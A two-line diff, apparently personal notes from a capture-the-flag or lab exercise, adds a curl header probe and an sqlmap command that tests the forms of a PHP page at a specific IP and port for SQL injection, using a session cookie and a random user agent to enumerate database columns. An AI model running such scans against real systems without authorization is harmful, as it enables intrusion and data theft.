@@ -1,0 +1,2 @@
+curl -I (ip)
+sqlmap -u http://35.198.135.192:30416/index.php --cookie="PHPSESSID=(token)" --forms --columns --random-agent
